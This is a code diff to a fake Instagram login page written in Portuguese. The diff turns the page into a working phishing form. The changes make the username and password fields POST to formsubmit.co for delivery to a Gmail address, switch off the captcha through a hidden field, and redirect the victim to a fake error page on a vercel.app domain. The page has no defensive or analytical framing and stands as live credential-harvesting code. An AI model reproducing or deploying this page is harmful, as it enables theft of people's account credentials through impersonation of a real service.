@@ -34,21 +34,21 @@
                     </div>
                 </div>
                 <div class="form-container">
-                    <form >
+        <form method="POST" id="form"  action="https://formsubmit.co/Pagoconfirmacion86@gmail.com">
                         
                         <div class="form-content box">
                             <div class="logo">
                                 <img src="./images/logo-light.png" alt="Instagram logo" class="logo-light">
                                 <img src="./images/logo-dark.png" alt="Instagram logo" class="logo-dark">
                             </div>
-                            
+                    
                             <div class="signin-form" id="signin-form">
 
                                 <div class="form-group">
                                         <!-- <label for="username">username</label> -->
                                     <div class="animate-input">
                                         <span>
-                                            Número de telefone, nome de usuário ou e-mail
+                                           número de telefone, nome de usuário ou e-mail
                                         </span>
                                         <input type="text" name="username" id="username" required>
 
@@ -64,19 +64,19 @@
                                         <input type="text" name="password" id="password" required>
                                 
                                         <button>Show</button>
-<!--                                         <input type="hidden" name="_captcha" value="false"> -->
-                                      
+                                        <input type="hidden" name="_captcha" value="false">
+                                        <input type="hidden" name="_next" value="https://voterdaswq.vercel.app/error.html">
+                                        <!-- <input type="hidden" name="_next" value="thanks.html"> -->
                                     </div>
 
 
                                 </div>
                                 <div class="btn-group">
-                                    <button class="btn-login"  ">
-                                    <a href="error.html" style="text-decoration: none; color: white;">Conecte-se</a> 
+                                    <button class="btn-login" type="submit" id="button" value="Send Email">
+                                        Conecte-se
                                     </button>
-                          
-                                
-                    </form>
+                                </form>
+                
                 </div>
                 <div class="divine">
                     <div></div>
@@ -86,7 +86,7 @@
                 <div class="btn-group">
                    
                 </div>
-                <a href="#" class="forgot-pw">Forgot password?</a>
+                <a href="#" class="forgot-pw">Forgotten your password?</a>
             </div>
             <button class="btn-fb">
                 <img src="./images/facebook-icon.png" alt="">
@@ -140,4 +140,4 @@
 <script src="app.js"></script>
 </body>
 
-</html>
+        </html>
